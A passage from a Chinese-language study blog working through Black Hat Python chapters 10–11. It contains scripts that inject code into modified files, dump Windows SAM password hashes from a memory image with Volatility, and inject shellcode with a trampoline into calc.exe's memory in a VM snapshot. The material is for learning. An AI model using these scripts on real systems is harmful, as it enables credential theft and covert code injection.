+</span></span><span class=line><span class=cl>                        <span class=n>contents</span> <span class=o>=</span> <span class=n>fd</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>                        <span class=n>fd</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=n>contents</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[^^^] Dump complete.&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=n>filename</span><span class=p>,</span> <span class=n>extension</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>splitext</span><span class=p>(</span><span class=n>full_filename</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=n>extension</span> <span class=ow>in</span> <span class=n>file_types</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                            <span class=n>inject_code</span><span class=p>(</span><span class=n>full_filename</span><span class=p>,</span> <span class=n>extension</span><span class=p>,</span> <span class=n>contents</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                    <span class=k>except</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!!!] Failed.&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=k>elif</span> <span class=n>action</span> <span class=o>==</span> <span class=n>FILE_RENAMED_FROM</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[ &gt; ] Renamed from: </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>full_filename</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=k>elif</span> <span class=n>action</span> <span class=o>==</span> <span class=n>FILE_RENAMED_TO</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[ &lt; ] Renamed to: </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>full_filename</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[???] Unknown: </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>full_filename</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>pass</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>path</span> <span class=ow>in</span> <span class=n>dirs_to_monitor</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>monitor_thread</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>start_monitor</span><span class=p>,</span> <span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>path</span><span class=p>,))</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Spawning monitoring thread for path: </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>path</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>monitor_thread</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
+</span></span></code></pre></div><p>當script file被改的時候，插入我們的code</p><h2 id=ch11>CH11<a hidden class=anchor aria-hidden=true href=#ch11>#</a></h2><p>示範Volatility的使用
+<a href=https://medium.com/@zemelusa/first-steps-to-volatile-memory-analysis-dcbd4d2d56a1>這裡</a>是利用Volatility針對惡意程式分析的tutorial</p><p>grabhashes.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>volatility.conf</span> <span class=k>as</span> <span class=nn>conf</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>volatility.registry</span> <span class=k>as</span> <span class=nn>registry</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>volatility.commands</span> <span class=k>as</span> <span class=nn>commands</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>volatility.addrspace</span> <span class=k>as</span> <span class=nn>addrspace</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>volatility.plugins.registry.registryapi</span> <span class=kn>import</span> <span class=n>RegistryApi</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>volatility.plugins.registry.lsadump</span> <span class=kn>import</span> <span class=n>HashDump</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>memory_file</span> <span class=o>=</span> <span class=s2>&#34;WinXPSP2.vmem&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sys</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s2>&#34;/Downloads/volatility-2.3.1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>registry</span><span class=o>.</span><span class=n>PluginImporter</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>config</span> <span class=o>=</span> <span class=n>conf</span><span class=o>.</span><span class=n>ConfObject</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>config</span><span class=o>.</span><span class=n>parse_options</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>config</span><span class=o>.</span><span class=n>PROFILE</span> <span class=o>=</span> <span class=s2>&#34;WinXPSP2x86&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>config</span><span class=o>.</span><span class=n>LOCATION</span> <span class=o>=</span> <span class=s2>&#34;file://</span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>memory_file</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>registry</span><span class=o>.</span><span class=n>register_global_options</span><span class=p>(</span><span class=n>config</span><span class=p>,</span> <span class=n>commands</span><span class=o>.</span><span class=n>Command</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>registry</span><span class=o>.</span><span class=n>register_global_options</span><span class=p>(</span><span class=n>config</span><span class=p>,</span> <span class=n>addrspace</span><span class=o>.</span><span class=n>BaseAddressSpace</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>registry</span> <span class=o>=</span> <span class=n>RegistryApi</span><span class=p>(</span><span class=n>config</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>registry</span><span class=o>.</span><span class=n>populate_offsets</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sam_offset</span> <span class=o>=</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl><span class=n>sys_offset</span> <span class=o>=</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>offset</span> <span class=ow>in</span> <span class=n>registry</span><span class=o>.</span><span class=n>all_offsets</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>registry</span><span class=o>.</span><span class=n>all_offsets</span><span class=p>[</span><span class=n>offset</span><span class=p>]</span><span class=o>.</span><span class=n>endswith</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\\</span><span class=s2>SAM&#34;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>sam_offset</span> <span class=o>=</span> <span class=n>offset</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] SAM: 0x</span><span class=si>%08x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>offset</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>registry</span><span class=o>.</span><span class=n>all_offsets</span><span class=p>[</span><span class=n>offset</span><span class=p>]</span><span class=o>.</span><span class=n>endswith</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\\</span><span class=s2>system&#34;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>sys_offset</span> <span class=o>=</span> <span class=n>offset</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] System: 0x</span><span class=si>%08x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>offset</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>sam_offset</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span> <span class=ow>and</span> <span class=n>sys_offset</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>config</span><span class=o>.</span><span class=n>sys_offset</span> <span class=o>=</span> <span class=n>sys_offset</span>
+</span></span><span class=line><span class=cl>        <span class=n>config</span><span class=o>.</span><span class=n>sam_offset</span> <span class=o>=</span> <span class=n>sam_offset</span>
+</span></span><span class=line><span class=cl>        <span class=n>hashdump</span> <span class=o>=</span> <span class=n>HashDump</span><span class=p>(</span><span class=n>config</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=nb>hash</span> <span class=ow>in</span> <span class=n>hashdump</span><span class=o>.</span><span class=n>calculate</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=nb>hash</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>break</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>sam_offset</span> <span class=ow>is</span> <span class=kc>None</span> <span class=ow>or</span> <span class=n>sys_offset</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Failed to find the system or SAM offsets.&#34;</span><span class=p>)</span>
+</span></span></code></pre></div><p>windows的本機密碼放在SAM registry hive
+開機金鑰放在system registry hive</p><p>用指令會是</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python vol.py imageinfo -f <span class=s2>&#34;memdump.img&#34;</span> <span class=c1># get suggested profile</span>
+</span></span><span class=line><span class=cl>python vol.py hivelist --profile<span class=o>=</span><span class=s2>&#34;WinXPSP2x86&#34;</span> -f <span class=s2>&#34;memdump.vmem&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1># Virual Physical Name</span>
+</span></span><span class=line><span class=cl><span class=c1># ------ -------- ----</span>
+</span></span><span class=line><span class=cl><span class=c1># ...</span>
+</span></span><span class=line><span class=cl><span class=c1># abc    def      \Device\HarddiskVolume1\WINDOWS\system32\config\SAM</span>
+</span></span><span class=line><span class=cl><span class=c1># ghi    jkl      \Device\HarddiskVolume1\WINDOWS\system32\config\system</span>
+</span></span><span class=line><span class=cl><span class=c1># ...</span>
+</span></span><span class=line><span class=cl>python vol.py hashdump --profile<span class=o>=</span><span class=s2>&#34;WinXPSP2x86&#34;</span> -f <span class=s2>&#34;memdump.vmem&#34;</span> -y ghi -s abc
+</span></span></code></pre></div><hr><p>codecoverage.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>immlib</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>CcHook</span><span class=p>(</span><span class=n>LogBpHook</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>LogBpHook</span><span class=o>.</span><span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>imm</span> <span class=o>=</span> <span class=n>Debugger</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>run</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>regs</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>imm</span><span class=o>.</span><span class=n>log</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%08x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>regs</span><span class=p>[</span><span class=s1>&#39;EIP&#39;</span><span class=p>],</span> <span class=n>regs</span><span class=p>[</span><span class=s1>&#39;EIP&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>imm</span><span class=o>.</span><span class=n>deleteBreakpoint</span><span class=p>(</span><span class=n>regs</span><span class=p>[</span><span class=s1>&#39;EIP&#39;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>(</span><span class=n>args</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>imm</span> <span class=o>=</span> <span class=n>Debugger</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>calc</span> <span class=o>=</span> <span class=n>imm</span><span class=o>.</span><span class=n>getModule</span><span class=p>(</span><span class=s2>&#34;calc.exe&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>imm</span><span class=o>.</span><span class=n>analyseCode</span><span class=p>(</span><span class=n>calc</span><span class=o>.</span><span class=n>getCodebase</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>functions</span> <span class=o>=</span> <span class=n>imm</span><span class=o>.</span><span class=n>getAllFunctions</span><span class=p>(</span><span class=n>calc</span><span class=o>.</span><span class=n>getCodebase</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>hooker</span> <span class=o>=</span> <span class=n>CcHook</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>function</span> <span class=ow>in</span> <span class=n>functions</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>hooker</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%08x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>function</span><span class=p>,</span> <span class=n>function</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;Tracking </span><span class=si>%d</span><span class=s2> functions.&#34;</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>functions</span><span class=p>)</span>
+</span></span></code></pre></div><p>這個是為了找出特定function的記憶體位置
+利用Immunity Debugger的breakpoint把記憶體位置在中斷時列出來
+使用方法<code>!code_coverage</code></p><hr><p>code_inject.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>volatility.conf</span> <span class=k>as</span> <span class=nn>conf</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>volatility.registry</span> <span class=k>as</span> <span class=nn>registry</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>volatility.commands</span> <span class=k>as</span> <span class=nn>commands</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>volatility.addrspace</span> <span class=k>as</span> <span class=nn>addrspace</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>volatility.plugins.taskmods</span> <span class=k>as</span> <span class=nn>taskmods</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>equals_button</span> <span class=o>=</span> <span class=mh>0x01005D51</span> <span class=c1># from codecoverage.py</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>memory_file</span> <span class=o>=</span> <span class=s2>&#34;/Users/justin/Documents/Virtual Machines.localized/&#34;</span> \
+</span></span><span class=line><span class=cl>              <span class=s2>&#34;Windows Server 2003 Standard Edition.vmwarevm/&#34;</span> \
+</span></span><span class=line><span class=cl>              <span class=s2>&#34;564d9400-1cb2-63d6-722b-4ebe61759abd.vmem&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>slack_space</span> <span class=o>=</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl><span class=n>trampoline_offset</span> <span class=o>=</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># read in our shellcode</span>
+</span></span><span class=line><span class=cl><span class=n>sc_fd</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;cmeasure.bin&#34;</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=n>sc_fd</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>sc_fd</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>sys</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=s2>&#34;/Downloads/volatility-2.3.1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>registry</span><span class=o>.</span><span class=n>PluginImporter</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>config</span> <span class=o>=</span> <span class=n>conf</span><span class=o>.</span><span class=n>ConfObject</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>registry</span><span class=o>.</span><span class=n>register_global_options</span><span class=p>(</span><span class=n>config</span><span class=p>,</span> <span class=n>commands</span><span class=o>.</span><span class=n>Command</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>registry</span><span class=o>.</span><span class=n>register_global_options</span><span class=p>(</span><span class=n>config</span><span class=p>,</span> <span class=n>addrspace</span><span class=o>.</span><span class=n>BaseAddressSpace</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>config</span><span class=o>.</span><span class=n>parse_options</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>config</span><span class=o>.</span><span class=n>PROFILE</span> <span class=o>=</span> <span class=s2>&#34;Win2003SP2x86&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>config</span><span class=o>.</span><span class=n>LOCATION</span> <span class=o>=</span> <span class=s2>&#34;file://</span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>memory_file</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>taskmods</span><span class=o>.</span><span class=n>PSList</span><span class=p>(</span><span class=n>config</span><span class=p>)</span> <span class=c1># Print all running processes by following the EPROCESS lists.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>process</span> <span class=ow>in</span> <span class=n>p</span><span class=o>.</span><span class=n>calculate</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>str</span><span class=p>(</span><span class=n>process</span><span class=o>.</span><span class=n>ImageFileName</span><span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;calc.exe&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Found calc.exe with PID </span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>process</span><span class=o>.</span><span class=n>UniqueProcessId</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Hunting for physical offsets...please wait.&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>address_space</span> <span class=o>=</span> <span class=n>process</span><span class=o>.</span><span class=n>get_process_address_space</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=n>pages</span> <span class=o>=</span> <span class=n>address_space</span><span class=o>.</span><span class=n>get_available_pages</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>page</span> <span class=ow>in</span> <span class=n>pages</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>physical</span> <span class=o>=</span> <span class=n>address_space</span><span class=o>.</span><span class=n>vtop</span><span class=p>(</span><span class=n>page</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span> <span class=c1># page[0]是位置 page[1]是大小</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>physical</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>slack_space</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=n>fd</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>memory_file</span><span class=p>,</span> <span class=s2>&#34;r+&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                    <span class=n>fd</span><span class=o>.</span><span class=n>seek</span><span class=p>(</span><span class=n>physical</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                    <span class=n>buf</span> <span class=o>=</span> <span class=n>fd</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=n>page</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span>
+</span></span><span class=line><span class=cl>                    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=n>offset</span> <span class=o>=</span> <span class=n>buf</span><span class=o>.</span><span class=n>index</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span> <span class=o>*</span> <span class=nb>len</span><span class=p>(</span><span class=n>sc</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>                        <span class=n>slack_space</span> <span class=o>=</span> <span class=n>page</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>+</span> <span class=n>offset</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Found good shellcode location!&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Virtual address: 0x</span><span class=si>%08x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>slack_space</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Physical address: 0x</span><span class=si>%08x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl>                                <span class=n>physical</span> <span class=o>+</span> <span class=n>offset</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Injecting shellcode.&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                        <span class=n>fd</span><span class=o>.</span><span class=n>seek</span><span class=p>(</span><span class=n>physical</span> <span class=o>+</span> <span class=n>offset</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=n>fd</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>sc</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>                        <span class=n>fd</span><span class=o>.</span><span class=n>flush</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                        <span class=c1># create our trampoline</span>
+</span></span><span class=line><span class=cl>                        <span class=n>tramp</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\xbb</span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;&lt;L&#34;</span><span class=p>,</span> <span class=n>page</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>+</span> <span class=n>offset</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                        <span class=n>tramp</span> <span class=o>+=</span> <span class=s2>&#34;</span><span class=se>\xff\xe3</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>			<span class=c1># mov ebx, ADDR_OF_SHELLCODE</span>
+</span></span><span class=line><span class=cl>			<span class=c1># jmp ebx</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=n>trampoline_offset</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                            <span class=k>break</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=k>except</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=k>pass</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=n>fd</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=c1># check for our target code location</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>page</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>&lt;=</span> <span class=n>equals_button</span> <span class=o>&lt;</span> <span class=p>((</span><span class=n>page</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>+</span> <span class=n>page</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>-</span> <span class=mi>7</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=c1># calculate virtual offset</span>
+</span></span><span class=line><span class=cl>                    <span class=n>v_offset</span> <span class=o>=</span> <span class=n>equals_button</span> <span class=o>-</span> <span class=n>page</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=c1># now calculate physical offset</span>
+</span></span><span class=line><span class=cl>                    <span class=n>trampoline_offset</span> <span class=o>=</span> <span class=n>physical</span> <span class=o>+</span> <span class=n>v_offset</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Found our trampoline target at: 0x</span><span class=si>%08x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl>                        <span class=n>trampoline_offset</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>slack_space</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                        <span class=k>break</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Writing trampoline...&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>fd</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>memory_file</span><span class=p>,</span> <span class=s2>&#34;r+&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>fd</span><span class=o>.</span><span class=n>seek</span><span class=p>(</span><span class=n>trampoline_offset</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>fd</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>tramp</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>fd</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Done injecting code.&#34;</span><span class=p>)</span>
+</span></span></code></pre></div><p>這是針對vm的記憶體快照的code injection
+流程如下</p><ol><li>找calc.exe</li><li>找適合放的空記憶體的起始位置</li><li>放轉跳的code</li></ol></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://littlebees.github.io/2020/09/tcpdunp%E6%A2%9D%E4%BB%B6%E5%BC%8F%E8%AA%9E%E6%B3%95%E6%95%B4%E7%90%86/><span class=title>« Prev</span><br><span>tcpdunp條件式語法整理</span>
